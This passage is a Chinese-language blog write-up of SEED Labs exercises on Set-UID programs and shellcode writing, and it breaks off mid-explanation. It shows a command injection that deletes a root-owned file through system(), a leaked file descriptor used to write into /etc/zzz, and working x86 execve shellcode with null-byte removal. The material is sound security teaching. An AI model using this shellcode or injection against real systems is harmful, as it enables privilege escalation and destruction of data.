环境变量被屏蔽，从标准路径查找链接库，所以链接的是标准库。所以结果为等待一秒后结束，无输出。</p><p>对于第三种情况，effective uid 等于 real uid，均为 root，LD_PRELOAD 环境变量没有被屏蔽，所以链接的是 libmylib.so.1.0.1，输出一句话</p><p>对于第四种情况，effective uid为temp，real uid为seed，不相同，LD_PRELOAD 环境变量被屏蔽，从标准路径查找链接库，所以链接的是标准库。所以结果为等待一秒后结束，无输出。</p><p><a name="ofBY2"></a></p><h2 id="2-8-Task-8-Invoking-External-Programs-Usingsystem-versus-execve"><a href="#2-8-Task-8-Invoking-External-Programs-Usingsystem-versus-execve" class="headerlink" title="2.8 Task 8: Invoking External Programs Usingsystem()versus execve()"></a><strong>2.8 Task 8: Invoking External Programs Using</strong>system()<strong>versus</strong> execve()</h2><p><a name="PYz4N"></a></p><h3 id="step1-4"><a href="#step1-4" class="headerlink" title="step1"></a>step1</h3><p>编译catall.c并设置为 root set-uid程序，正常运行没有什么问题<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1698326396076-03d2b76b-32d3-48c0-bb59-dad08dcab675.png#averageHue=%232b2826&clientId=u23fef80c-c7f1-4&from=paste&height=154&id=ud91a9c96&originHeight=243&originWidth=798&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=56293&status=done&style=none&taskId=u3af92f66-af8e-462a-bf59-78f4ebd5889&title=&width=506.6666896759528" alt="image.png"><br />这里要演示实施一个删除文件攻击, 用 root 账户在 &#x2F;root 目录下 新建一个文件 tempfile， 然后切换到 seed 账户，可以看到无法访问也无法删除该文件<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1698326823092-7eb0ee71-22b2-4fb5-ba4a-4c1cc31ebceb.png#averageHue=%232e2c2a&clientId=u23fef80c-c7f1-4&from=paste&height=190&id=uaabd21fd&originHeight=299&originWidth=733&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=56691&status=done&style=none&taskId=ud8f45c3a-60e6-4b09-ba5a-fb6619cae70&title=&width=465.39684653192154" alt="image.png"><br />普通用户只要运行 .&#x2F;task8 “.&#x2F;task8.c; rm &#x2F;root&#x2F;tempfile” 即可删除刚才的文件，<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1698327046206-abf99125-5f5b-4dfc-8b49-9cd9904f6758.png#averageHue=%23222121&clientId=u23fef80c-c7f1-4&from=paste&height=483&id=u57b64c5e&originHeight=760&originWidth=876&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=59515&status=done&style=none&taskId=u66e9e75e-0652-46a1-863e-9a33c8b5e59&title=&width=556.1905014487903" alt="image.png"><br />从下面结果可以看出，该文件已经成功被删除<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1698327067729-7b724b90-600b-449f-95ae-654996b01ca1.png#averageHue=%232a2524&clientId=u23fef80c-c7f1-4&from=paste&height=140&id=ucbc98ba6&originHeight=220&originWidth=875&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=37332&status=done&style=none&taskId=uaa4331d0-3d9a-459f-9eb8-5b8bdb35891&title=&width=555.555580785036" alt="image.png"><br><a name="GN3zY"></a></p><h3 id="step2-4"><a href="#step2-4" class="headerlink" title="step2"></a>step2</h3><p>将 step 1 中的调用 system 函数 改成调用 execve。重复上面的流程，可以发现，运行报错并且未删除该文件<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1698327581310-c4c9b583-04fe-4d7e-a83b-948a87f560f8.png#averageHue=%232c2a28&clientId=u23fef80c-c7f1-4&from=paste&height=227&id=uac2e1009&originHeight=357&originWidth=769&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=74934&status=done&style=none&taskId=u214d6c70-3635-4564-9daf-a51a521ee03&title=&width=488.2539904270773" alt="image.png"><br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1698327623965-eb900678-96ea-4fa8-9dfd-5e2b177eaaf8.png#averageHue=%232e2c2a&clientId=u23fef80c-c7f1-4&from=paste&height=35&id=u73c61648&originHeight=55&originWidth=965&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=13380&status=done&style=none&taskId=ue7fcc90a-7517-4c05-940b-80725ec942e&title=&width=612.6984405229254" alt="image.png"><br />原因分析：在使用 system函数时，最终是 shell 去执行命令，而且未仔细检查用户输入，使得其执行了两条命令。其中第二条命令为恶意构造的命令，删除了文件。改成使用 execve 之后，这种攻击方式是不会成功的，因为它是通过系统调用的方式去执行，只能执行一个进程，且进程名已指定，不会产生这种漏洞。</p><p><a name="ZRXSy"></a></p><h2 id="2-9-Task-9-Capability-Leaking"><a href="#2-9-Task-9-Capability-Leaking" class="headerlink" title="2.9 Task 9: Capability Leaking"></a><strong>2.9 Task 9: Capability Leaking</strong></h2><p>修改所给代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> fd;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* Assume that /etc/zzz is an important system file,</span></span><br><span class="line"><span class="comment">     * and it is owned by root with permission 0644.</span></span><br><span class="line"><span class="comment">     * Before running this program, you should creat </span></span><br><span class="line"><span class="comment">     * the file /etc/zzz first. */</span></span><br><span class="line"> </span><br><span class="line">    fd = open(<span class="string">&quot;/etc/zzz&quot;</span>, O_RDWR | O_APPEND);</span><br><span class="line">    <span class="keyword">if</span> (fd == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Cannot open /etc/zzz\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* Simulate the tasks conducted by the program */</span></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* After the task, the root privileges are no longer needed, </span></span><br><span class="line"><span class="comment">       it’s time to relinquish the root privileges permanently. */</span></span><br><span class="line">    setuid(getuid()); <span class="comment">/* getuid() returns the real uid */</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (fork()) &#123; <span class="comment">/* In the parent process */</span> </span><br><span class="line">        close (fd); </span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">/* in the child process */</span> </span><br><span class="line">        <span class="comment">/* Now, assume that the child process is compromised, malicious </span></span><br><span class="line"><span class="comment">           attackers have injected the following statements </span></span><br><span class="line"><span class="comment">           into this process */</span></span><br><span class="line"> </span><br><span class="line">        write (fd, <span class="string">&quot;Malicious Data\n&quot;</span>, <span class="number">15</span>); </span><br><span class="line">        close (fd);</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先用 root 权限创建 &#x2F;etc&#x2F;zzz 文件。然后编译上面代码，并设置为 root set-uid程序。使用普通账户运行该程序发现等了一秒，无输出。查看 &#x2F;etc&#x2F;zzz 可以发现文件内容已经被修改。<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1698328641840-30853c53-24f5-48a5-9412-9e82e2250235.png#averageHue=%232a2726&clientId=u23fef80c-c7f1-4&from=paste&height=207&id=ufb8d9f6e&originHeight=326&originWidth=795&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=79918&status=done&style=none&taskId=ua3bdc1ee-5631-4e02-ad41-83703600be1&title=&width=504.76192768468985" alt="image.png"><br /><strong>原因分析：</strong>这个特权程序打开了一个重要的的系统文件，并且在放弃特权时没有关闭该文件，而后调用Fork，子进程会继承这个文件描述符，造成特权泄露。子进程可以通过泄露的文件描述符向文件写入恶意内容</p>]]></content>
      
      
      <categories>
          
          <category> seedlab </category>
          
      </categories>
      
      
        <tags>
            
            <tag> seedlab 环境变量 set-uid </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEEDLAB：shellcode编写实验</title>
      <link href="/post/b0bff83c.html"/>
      <url>/post/b0bff83c.html</url>
      
        <content type="html"><![CDATA[<p><a name="cIZ0i"></a></p><h1 id="1-实验内容"><a href="#1-实验内容" class="headerlink" title="1    实验内容"></a>1    实验内容</h1><p>shellcode广泛用于许多涉及代码注入的攻击中。编写shellcode是相当有挑战性的。虽然我们可以很容易地从互联网上找到现有的shellcode，但是能够从头开始编写我们自己的shellcode总是令人兴奋的。shellcode中涉及到几种有趣的技术。本实验室的目的是帮助学生理解这些技术，以便他们能够编写自己的shellcode。</p><p>编写shellcode有几个挑战，一个是确保二进制文件中没有0x00，另一个是找出命令中使用的数据的地址。第一个挑战不是很难解决，有几种方法可以解决它。第二个挑战的解决方案导致了编写外壳代码的两种典型方法。在一种方法中，数据在执行期间被推入堆栈，因此可以从堆栈指针获得它们的地址。在第二种方法中，数据存储在代码区域中，就在调用指令之后，因此在调用调用函数时，其地址被推入堆栈（作为返回地址）。两种解决方案都非常优雅，我们希望学生能够学习这两种技术。<br><a name="vg0k9"></a></p><h1 id="2-实验步骤及结果"><a href="#2-实验步骤及结果" class="headerlink" title="2    实验步骤及结果"></a>2    实验步骤及结果</h1><p><a name="vTOH6"></a></p><h2 id="2-1Task-1-Writing-Shellcode"><a href="#2-1Task-1-Writing-Shellcode" class="headerlink" title="2.1Task 1: Writing Shellcode"></a><strong>2.1</strong>Task 1: Writing Shellcode</h2><p><a name="X4NcV"></a></p><h3 id="2-1-1-Task-1-a-The-Entire-Process"><a href="#2-1-1-Task-1-a-The-Entire-Process" class="headerlink" title="2.1.1     Task 1.a: The Entire Process"></a><strong>2.1.1     Task 1.a: The Entire Process</strong></h3><p>首先来看一下C语言版本的shellcode：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> *argv[<span class="number">2</span>];</span><br><span class="line">    argv[<span class="number">0</span>]=<span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">    argv[<span class="number">1</span>]=<span class="literal">NULL</span>;</span><br><span class="line">    execve (argv[<span class="number">0</span>],argv,<span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所给的汇编代码（mysh.s）可以启动一个shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">section .text</span><br><span class="line">  global _start</span><br><span class="line">    _start:</span><br><span class="line">      ; Store the argument string on stack</span><br><span class="line">      xor  eax, eax </span><br><span class="line">      push eax          ; Use 0 to terminate the string</span><br><span class="line">      push &quot;//sh&quot;</span><br><span class="line">      push &quot;/bin&quot;</span><br><span class="line">      mov  ebx, esp     ; Get the string address</span><br><span class="line"></span><br><span class="line">      ; Construct the argument array argv[]</span><br><span class="line">      push eax          ; argv[1] = 0</span><br><span class="line">      push ebx          ; argv[0] points &quot;/bin//sh&quot;</span><br><span class="line">      mov  ecx, esp     ; Get the address of argv[]</span><br><span class="line">   </span><br><span class="line">      ; For environment variable </span><br><span class="line">      xor  edx, edx     ; No env variables </span><br><span class="line"></span><br><span class="line">      ; Invoke execve()</span><br><span class="line">      xor  eax, eax     ; eax = 0x00000000</span><br><span class="line">      mov   al, 0x0b    ; eax = 0x0000000b</span><br><span class="line">      int 0x80</span><br></pre></td></tr></table></figure><p>使用nasm 编译上面的汇编代码(mysh.s)</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span> nasm <span class="operator">-f</span> elf32 mysh.s <span class="literal">-o</span> mysh.o</span><br></pre></td></tr></table></figure><blockquote><p>nasm 是用于 Intel x86和 x64架构的汇编和反汇编程序。-f elf32选项表明我们希望将代码编译为32位 ELF 二进制格式</p></blockquote><p><img src="https://cdn.nlark.com/yuque/0/2023/jpeg/35921061/1697632914113-3bc4ab27-3579-45ed-b7ce-46c1ab87b8c5.jpeg#averageHue=%23eeeeee&clientId=u28cfadfd-6309-4&from=paste&height=118&id=u1d26fe27&originHeight=414&originWidth=1908&originalType=url&ratio=1.5749999284744263&rotation=0&showTitle=false&status=done&style=none&taskId=ubf1866b4-8313-4498-aba4-b20a5a13f60&title=&width=545.4583740234375"><br />通过链接得到可执行文件:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ld -m elf_i386 mysh.o -o mysh</span><br></pre></td></tr></table></figure><p>用.&#x2F;mysh执行得到的的二进制文件，结果如下图，我们用echo $$得到目前进程的id<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1697633563238-3b912850-458e-416d-a881-08af606d57a4.png#averageHue=%23040302&clientId=u28cfadfd-6309-4&from=paste&height=103&id=u12ea67b9&originHeight=162&originWidth=864&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=28141&status=done&style=none&taskId=ubd40ac41-1ab4-45f0-8507-f3b5e37c987&title=&width=549" alt="image.png"><br />看到运行mysh之前的PID与运行mysh之后的PID是不同的，证明我们通过mysh启动了一个新的shell<br />接下来，我们需要从可执行文件或目标文件中提取机器代码（machine code）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -Mintel --disassemble mysh.o</span><br></pre></td></tr></table></figure><p>得到：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1697633773399-ea926676-c86d-449f-8e92-e3ea738553dc.png#averageHue=%23080605&clientId=u28cfadfd-6309-4&from=paste&height=317&id=u51d00541&originHeight=499&originWidth=665&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=66158&status=done&style=none&taskId=ueb0d1f1f-ae54-412a-afb8-0e163f3fc70&title=&width=422.22224139662734" alt="image.png"></p><ul><li>-Mintel表示显示Intel格式的汇编代码，而非默认的ATT格式</li><li>–disassemble表示反汇编，也可以使用-d代替</li></ul><p>可以使用xxd命令获取二进制序列</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxd -p -c 20 mysh.o</span><br></pre></td></tr></table></figure><p>得到：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1697634206605-2f5817db-f9d0-4898-853e-3db8f91d92a1.png#averageHue=%23292119&clientId=u28cfadfd-6309-4&from=paste&height=397&id=u3534d15f&originHeight=625&originWidth=558&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=61086&status=done&style=none&taskId=ubd53eb2b-887a-474f-8f1c-6e85fbd6af4&title=&width=354.28573037491435" alt="image.png"></p><ul><li>-p表示列之间不需要空格</li><li>-c 20表示一行有20个字符</li></ul><p>由前面可知机器码的起始和结尾分别为31c0、cd80，因此截取二者之间的内容，并将内容复制到convert.py中。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">ori_sh =<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">31c050682f2f7368</span></span><br><span class="line"><span class="string">682f62696e89e3505389e131d231c0b00bcd80</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">sh = ori_sh.replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">length  = <span class="built_in">int</span>(<span class="built_in">len</span>(sh)/<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Length of the shellcode: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(length))</span><br><span class="line">s = <span class="string">&#x27;shellcode= (\n&#x27;</span> + <span class="string">&#x27;   &quot;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">    s += <span class="string">&quot;\\x&quot;</span> + sh[<span class="number">2</span>*i] + sh[<span class="number">2</span>*i+<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> i &gt; <span class="number">0</span> <span class="keyword">and</span> i % <span class="number">16</span> == <span class="number">15</span>: </span><br><span class="line">        s += <span class="string">&#x27;&quot;\n&#x27;</span> + <span class="string">&#x27;   &quot;&#x27;</span></span><br><span class="line">s += <span class="string">&#x27;&quot;\n&#x27;</span> + <span class="string">&quot;).encode(&#x27;latin-1&#x27;)&quot;</span></span><br><span class="line"><span class="built_in">print</span>(s)</span><br></pre></td></tr></table></figure><p>执行convert.py文件，得到shellcode中包含的16进制形式的机器码，如下：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1697634636015-ac0ddcfd-fd9a-42de-9ecd-6fd68c988b26.png#averageHue=%230a0806&clientId=u28cfadfd-6309-4&from=paste&height=116&id=ub42b6b88&originHeight=182&originWidth=907&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=27567&status=done&style=none&taskId=u7da820f9-f63a-4177-ad28-84f649f2c81&title=&width=575.8730420251744" alt="image.png"><br><a name="n4fMc"></a></p><h3 id="2-1-2-Task-1-b-Eliminating-Zeros-from-the-Code"><a href="#2-1-2-Task-1-b-Eliminating-Zeros-from-the-Code" class="headerlink" title="2.1.2        Task 1.b. Eliminating Zeros from the Code"></a><strong>2.1.2        Task 1.b. Eliminating Zeros from the Code</strong></h3><blockquote><p>Shellcode 广泛应用于缓冲区溢出攻击。在许多情况下，漏洞是由字符串复制引起的，例如 strcpy ()函数。对于这些字符串复制函数，零被认为是字符串的末尾。因此，如果我们在 shell 代码的中间有一个零，字符串复制将不能将零后面的任何内容从这个 shell 代码复制到目标缓冲区，因此攻击将不能成功</p></blockquote><p>因此我们有必要将上面二进制序列的0去除<br />一些去0的方法：</p><ul><li><p>使用xor eax，eax去取代mov eax, 0</p></li><li><p>如果我们要存储0x0000099到 eax。我们不能只使用 mov eax，0x99，因为第二个操作数实际上是0x0000099，它包含三个零</p><ul><li>首先将 eax 设置为零，然后为 al 寄存器分配一个1字节的数字0x99</li></ul></li><li><p>使用移位操作</p><ul><li>下面操作等价于将xyz\0赋给ebx<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov ebx, &quot;xyz#&quot;</span><br><span class="line">shl ebx, 8</span><br><span class="line">shr ebx, 8</span><br></pre></td></tr></table></figure>接下来到了第一个任务，我们需要执行&#x2F;bin&#x2F;bash，并且不可以有多余的&#x2F;<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">section .text</span><br><span class="line"></span><br><span class="line">  global _start</span><br><span class="line">    _start:</span><br><span class="line">      ; Store the argument string on stack</span><br><span class="line">      xor  eax, eax </span><br><span class="line">      push eax          ; Use 0 to terminate the string</span><br><span class="line">    mov ebx,&quot;hhhh&quot;   ;4个h用来占位</span><br><span class="line">        shl ebx, 24 ;左移24bit</span><br><span class="line">        shr ebx, 24 ;右移24bit</span><br><span class="line">        push ebx</span><br><span class="line">      push &quot;/bas&quot;</span><br><span class="line">      push &quot;/bin&quot;</span><br><span class="line">      mov  ebx, esp     ; Get the string address</span><br><span class="line"></span><br><span class="line">      ; Construct the argument array argv[]</span><br><span class="line">      push eax          ; argv[1] = 0</span><br><span class="line">      push ebx          ; argv[0] points &quot;/bin//sh&quot;</span><br><span class="line">      mov  ecx, esp     ; Get the address of argv[]</span><br><span class="line">   </span><br><span class="line">      ; For environment variable </span><br><span class="line">      xor  edx, edx     ; No env variables </span><br><span class="line"></span><br><span class="line">      ; Invoke execve()</span><br><span class="line">      xor  eax, eax     ; eax = 0x00000000</span><br><span class="line">      mov   al, 0x0b    ; eax = 0x0000000b</span><br><span class="line">      int 0x80</span><br></pre></td></tr></table></figure></li></ul></li><li><p>我们需要构造出&#x2F;bin&#x2F;bash\0的字符串</p></li><li><p>由于直接使用0会导致strcpy失败，因此可以使用移位操作获取0</p></li><li><p>注意到push的操作数只能是32位&#x2F;64数</p></li></ul><p>重新编译运行：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1697637009660-4466394b-7baf-4dd7-9c9c-ca60355e6795.png#averageHue=%23090705&clientId=u28cfadfd-6309-4&from=paste&height=166&id=u6be44f03&originHeight=261&originWidth=978&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=69270&status=done&style=none&taskId=u175697da-45e0-4732-a48a-d8688723d82&title=&width=620.9524091517317" alt="image.png"><br />反汇编看一下结果，没有0字节<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1697637056712-302a29a8-4009-42ff-8987-5d3d81abc2d1.png#averageHue=%23060504&clientId=u28cfadfd-6309-4&from=paste&height=399&id=u4c1fa2b1&originHeight=629&originWidth=960&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=94793&status=done&style=none&taskId=u9a8c7bdc-c333-44ab-8647-14a153365bd&title=&width=609.5238372041538" alt="image.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1697637141702-29a5b50b-b6dc-42a9-8362-d520455ea7d3.png#averageHue=%231e1813&clientId=u28cfadfd-6309-4&from=paste&height=399&id=u36d7f1c6&originHeight=628&originWidth=750&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=73519&status=done&style=none&taskId=u8abdc82d-5044-483c-b273-c26bae96fc1&title=&width=476.1904978157451" alt="image.png"><br><a name="n05T7"></a></p><h3 id="2-1-3-Task-1-c-Providing-Arguments-for-System-Calls"><a href="#2-1-3-Task-1-c-Providing-Arguments-for-System-Calls" class="headerlink" title="2.1.3        Task 1.c. Providing Arguments for System Calls"></a><strong>2.1.3        Task 1.c. Providing Arguments for System Calls</strong></h3><p>使用execve实现以下命令的执行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/sh -c &quot;ls -la&quot;</span><br></pre></td></tr></table></figure><p>则修改mysh，将&#x2F;bin&#x2F;sh -c “ls -la”压入栈中，通过#占位和左右移位的方式来引入空格<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1697692746181-f159b6bb-e4ce-41d4-b003-45f761f7c2a7.png#averageHue=%23e2e1df&clientId=ua3204ecc-477c-4&from=paste&height=75&id=u9d0ca084&originHeight=119&originWidth=319&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=13336&status=done&style=none&taskId=u0013570f-dd0d-4acf-be12-c1f1f058e35&title=&width=201" alt="image.png"></p><blockquote><p><strong>mysh.s修改后全部代码</strong></p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">section .text</span><br><span class="line">  global _start</span><br><span class="line">    _start:</span><br><span class="line">      ; Store the argument string on stack</span><br><span class="line">      xor  eax, eax</span><br><span class="line">      push eax          ; Use 0 to terminate the string</span><br><span class="line">      </span><br><span class="line">push &quot;//sh&quot;</span><br><span class="line">      push &quot;/bin&quot;</span><br><span class="line">      mov  ebx, esp     ; argv[0]</span><br><span class="line"></span><br><span class="line">      push eax</span><br><span class="line">      mov eax,&quot;##-c&quot;</span><br><span class="line">      shr eax,16</span><br><span class="line">      push eax</span><br><span class="line">    xor eax,eax</span><br><span class="line">    mov  ecx, esp      ; argv[1]</span><br><span class="line"></span><br><span class="line">      mov eax,&quot;##la&quot;</span><br><span class="line">    shr eax,16</span><br><span class="line">      push eax</span><br><span class="line">    xor eax,eax</span><br><span class="line">    push &quot;ls -&quot;</span><br><span class="line">      mov  edx,esp       ; argv[2]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      push eax ; 0 terminate</span><br><span class="line">      push edx ; ls -al</span><br><span class="line">      push ecx ; -c </span><br><span class="line">      push ebx ; /bin/sh</span><br><span class="line">      mov ecx,esp</span><br><span class="line"></span><br><span class="line">      ; For environment variable </span><br><span class="line">      xor  edx, edx     ; No env variables </span><br><span class="line"></span><br><span class="line">      ; Invoke execve()</span><br><span class="line">      xor  eax, eax     ; eax = 0x00000000</span><br><span class="line">      mov   al, 0x0b    ; eax = 0x0000000b</span><br><span class="line">      int 0x80</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>:::info<br><strong>分块解释：</strong><br>:::</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xor eax, eax</span><br><span class="line">push eax          ; Use 0 to terminate the string</span><br></pre></td></tr></table></figure><p>这两行将寄存器 eax 的值与自身进行异或操作，将 eax 清零。然后将 eax 的值（即 0）压入栈中，用作字符串的终止符号。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push &quot;//sh&quot;</span><br><span class="line">push &quot;/bin&quot;</span><br><span class="line">mov  ebx, esp     ; argv[0]</span><br></pre></td></tr></table></figure><p>这三行将字符串 “&#x2F;&#x2F;sh” 和 “&#x2F;bin” 压入栈中。然后将栈顶的地址（即 “&#x2F;bin” 字符串的地址）存储到寄存器 ebx 中，作为参数列表的第一个参数 argv[0]。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">push eax</span><br><span class="line">mov eax, &quot;##-c&quot;</span><br><span class="line">shr eax, 16</span><br><span class="line">push eax</span><br><span class="line">xor eax, eax</span><br><span class="line">mov ecx, esp      ; argv[1]</span><br></pre></td></tr></table></figure><p>这几行将一个特殊的字符串 “##-c” 压入栈中。然后将 eax 的值右移 16 位，将高 16 位清零。再将 eax 的值（即低 16 位）压入栈中作为参数列表的第二个参数 argv[1]。最后，将栈顶的地址存储到寄存器 ecx 